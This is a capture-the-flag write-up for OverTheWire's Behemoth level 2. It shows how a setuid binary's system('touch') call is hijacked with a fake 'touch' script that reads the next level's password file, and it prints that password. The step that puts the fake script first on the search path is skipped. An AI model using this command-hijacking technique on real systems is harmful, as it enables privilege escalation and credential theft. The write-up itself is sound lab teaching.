__Behemoth :: Level 2__
================


_John Hammond_ | _Sunday, November 8th, 2015_ 


> There is no information for this level, intentionally.


----------


Start by [`ssh`][ssh]ing into the level. Supply the password you retrieved in the previous level. 

```
ssh behemoth2@behemoth.labs.overthewire.org
```


`cd` into `/behemoth/` as necessary, to see the files for this level.

`behemoth2` is what we care about. Let's run it. 

It gives us this error, `Permission denied`. It is apparently coming from the `touch` command. Uh, what is the program doing? Or, at least, trying to do?

Let's [`ltrace`][ltrace] it.

```
behemoth2@melinda:/behemoth$ ltrace ./behemoth2
__libc_start_main(0x804856d, 1, 0xffffd794, 0x8048640 <unfinished ...>
getpid()                                             = 3682
sprintf("touch 3682", "touch %d", 3682)              = 10
__lxstat(3, "3682", 0xffffd688)                      = -1
unlink("3682")                                       = -1
system("touch 3682"touch: cannot touch '3682': Permission denied
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                               = 256
sleep(2000
```

It looks like [gets the current process id][getpid], prints out a string, and then tries to create a file with the [`touch`][touch] command by calling [`system`][system].

Wait, calling [`system`][system]!? [`system`][system] is another vulnerable [C] function in that it essentially is just running code straight from the shell, as if you were just typing into the command-line. If all it is doing is running the [`touch`][touch] command, couldn't we just... _fake_ the [`touch`][touch] command?

So this is very easy to do.

Let's hop into a directory we have [write permission][permissions] in ([`/tmp/`][tmp]). We can create a new file with a command-line text editor ([`nano`][nano]), appropriately named 'touch', and have it run some code for us.

```
behemoth2@melinda:/behemoth$ mkdir /tmp/bacon
behemoth2@melinda:/behemoth$ cd /tmp/bacon
```

We could make it a shell script that just, simply and easily, spews out the next level's password. We wouldn't be able to do this if we ran script as our current user, but since the `behemoth2` program is running with the next level's privileges and [permissions], we could trick it into running _this form_ of "touch", and showing us the password.

Here's the small script.

```
behemoth2@melinda:/tmp/bacon$ nano touch
```

```
#!/bin/sh

cat /etc/behemoth_pass/behemoth3
```

Don't forget that [sha-bang] line, it's crucial in this one. You can exit [`nano`][nano] with `Ctrl+X` and `Enter` to save the script.

Make sure you make this code executable with the [`chmod`][chmod] command. 

```
behemoth2@melinda:/tmp/bacon$ chmod +x touch
```

Sweet, so now our code is ready to be run. We just have to trick the `behemoth2` program into thinking _our code_ takes precedence over the other, actual [`touch`][touch] command.




__The password for behemoth3 is `nieteidiel`.__

[netcat]: https://en.wikipedia.org/wiki/Netcat
[Wikipedia]: https://www.wikipedia.org/
[Linux]: https://www.linux.com/
[man page]: https://en.wikipedia.org/wiki/Man_page
[PuTTY]: http://www.putty.org/
[ssh]: https://en.wikipedia.org/wiki/Secure_Shell
[Windows]: http://www.microsoft.com/en-us/windows
[virtual machine]: https://en.wikipedia.org/wiki/Virtual_machine
[operating system]:https://en.wikipedia.org/wiki/Operating_system
[OS]: https://en.wikipedia.org/wiki/Operating_system
[VMWare]: http://www.vmware.com/
[VirtualBox]: https://www.virtualbox.org/
[hostname]: https://en.wikipedia.org/wiki/Hostname
[port number]: https://en.wikipedia.org/wiki/Port_%28computer_networking%29
[distribution]:https://en.wikipedia.org/wiki/Linux_distribution
[Ubuntu]: http://www.ubuntu.com/
[ISO]: https://en.wikipedia.org/wiki/ISO_image
[standard streams]: https://en.wikipedia.org/wiki/Standard_streams
[read]: http://ss64.com/bash/read.html
[variable]: https://en.wikipedia.org/wiki/Variable_%28computer_science%29
[command substitution]: http://www.tldp.org/LDP/abs/html/commandsub.html
[permissions]: https://en.wikipedia.org/wiki/File_system_permissions
[redirection]: http://www.tldp.org/LDP/abs/html/io-redirection.html
[tmp]: http://www.tldp.org/LDP/Linux-Filesystem-Hierarchy/html/tmp.html
[curl]: http://curl.haxx.se/
[cl1p.net]: https://cl1p.net/
[request]: http://www.w3.org/Protocols/rfc2616/rfc2616-sec5.html
[POST request]: https://en.wikipedia.org/wiki/POST_%28HTTP%29
[Python]: http://python.org/
[interpreter]: https://en.wikipedia.org/wiki/List_of_command-line_interpreters
[requests]: http://docs.python-requests.org/en/latest/
[urllib]: https://docs.python.org/2/library/urllib.html
[file handling with Python]: https://docs.python.org/2/tutorial/inputoutput.html#reading-and-writing-files
[bash]: https://www.gnu.org/software/bash/
[Assembly]: https://en.wikipedia.org/wiki/Assembly_language
[the stack]:  https://en.wikipedia.org/wiki/Stack_%28abstract_data_type%29
[register]: http://www.tutorialspoint.com/assembly_programming/assembly_registers.htm
[hex]: https://en.wikipedia.org/wiki/Hexadecimal
[archive file]: https://en.wikipedia.org/wiki/Archive_file
[zip file]: https://en.wikipedia.org/wiki/Zip_%28file_format%29
[gigabytes]: https://en.wikipedia.org/wiki/Gigabyte
[GB]: https://en.wikipedia.org/wiki/Gigabyte
[GUI]: https://en.wikipedia.org/wiki/Graphical_user_interface
[Wireshark]: https://www.wireshark.org/
[FTP]: https://en.wikipedia.org/wiki/File_Transfer_Protocol
[client and server]: https://simple.wikipedia.org/wiki/Client-server
[RETR]: http://cr.yp.to/ftp/retr.html
[FTP server]: https://help.ubuntu.com/lts/serverguide/ftp-server.html
[SFTP]: https://en.wikipedia.org/wiki/SSH_File_Transfer_Protocol
[SSL]: https://en.wikipedia.org/wiki/Transport_Layer_Security
[encryption]: https://en.wikipedia.org/wiki/Encryption
[HTML]: https://en.wikipedia.org/wiki/HTML
[Flask]: http://flask.pocoo.org/
[SQL]: https://en.wikipedia.org/wiki/SQL
[and]: https://en.wikipedia.org/wiki/Logical_conjunction
[Cyberstakes]: https://cyberstakesonline.com/
[cat]: https://en.wikipedia.org/wiki/Cat_%28Unix%29
[symbolic link]: https://en.wikipedia.org/wiki/Symbolic_link
[ln]: https://en.wikipedia.org/wiki/Ln_%28Unix%29
[absolute path]: https://en.wikipedia.org/wiki/Path_%28computing%29
[CTF]: https://en.wikipedia.org/wiki/Capture_the_flag#Computer_security
[Cyberstakes]: https://cyberstakesonline.com/
[OverTheWire]: http://overthewire.org/
[Leviathan]: http://overthewire.org/wargames/leviathan/
[ls]: https://en.wikipedia.org/wiki/Ls
[grep]: https://en.wikipedia.org/wiki/Grep
[strings]: http://linux.die.net/man/1/strings
[ltrace]: http://linux.die.net/man/1/ltrace
[C]: https://en.wikipedia.org/wiki/C_%28programming_language%29
[strcmp]: http://linux.die.net/man/3/strcmp
[access]: http://pubs.opengroup.org/onlinepubs/009695399/functions/access.html
[system]: http://linux.die.net/man/3/system
[real user ID]: https://en.wikipedia.org/wiki/User_identifier
[effective user ID]: https://en.wikipedia.org/wiki/User_identifier
[brute force]: https://en.wikipedia.org/wiki/Brute-force_attack
[for loop]: https://en.wikipedia.org/wiki/For_loop
[bash programming]: http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
[Behemoth]: http://overthewire.org/wargames/behemoth/
[gets]: http://www.cplusplus.com/reference/cstdio/gets/
[buffer overflow]: https://en.wikipedia.org/wiki/Buffer_overflow
[try harder]: https://www.offensive-security.com/when-things-get-tough/
[segmentation fault]: https://en.wikipedia.org/wiki/Segmentation_fault
[seg fault]: https://en.wikipedia.org/wiki/Segmentation_fault
[segfault]: https://en.wikipedia.org/wiki/Segmentation_fault
[shellcode]: https://en.wikipedia.org/wiki/Shellcode
[sploit-tools]: https://github.com/SaltwaterC/sploit-tools
[Kali]: https://www.kali.org/
[Kali Linux]: https://www.kali.org/
[gdb]: https://www.gnu.org/software/gdb/
[gdb tutorial]: http://www.unknownroad.com/rtfm/gdbtut/gdbtoc.html
[payload]: https://en.wikipedia.org/wiki/Payload_%28computing%29
[peda]: https://github.com/longld/peda
[git]: https://git-scm.com/
[home directory]: https://en.wikipedia.org/wiki/Home_directory
[NOP slide]:https://en.wikipedia.org/wiki/NOP_slide
[NOP]: https://en.wikipedia.org/wiki/NOP
[examine]: https://sourceware.org/gdb/onlinedocs/gdb/Memory.html
[stack pointer]: http://stackoverflow.com/questions/1395591/what-is-exactly-the-base-pointer-and-stack-pointer-to-what-do-they-point
[little endian]: https://en.wikipedia.org/wiki/Endianness
[big endian]: https://en.wikipedia.org/wiki/Endianness
[endianness]: https://en.wikipedia.org/wiki/Endianness
[pack]: https://docs.python.org/2/library/struct.html#struct.pack
[ash]:https://en.wikipedia.org/wiki/Almquist_shell
[dash]: https://en.wikipedia.org/wiki/Almquist_shell
[touch]: https://en.wikipedia.org/wiki/Touch_%28Unix%29f
[getpid]: http://man7.org/linux/man-pages/man2/getpid.2.html
[system]: http://www.cplusplus.com/reference/cstdlib/system/
[nano]: http://www.nano-editor.org/
[sha-bang]: https://en.wikipedia.org/wiki/Shebang_%28Unix%29
[shabang]: https://en.wikipedia.org/wiki/Shebang_%28Unix%29
[shebang]: https://en.wikipedia.org/wiki/Shebang_%28Unix%29
[chmod]: https://en.wikipedia.org/wiki/Chmod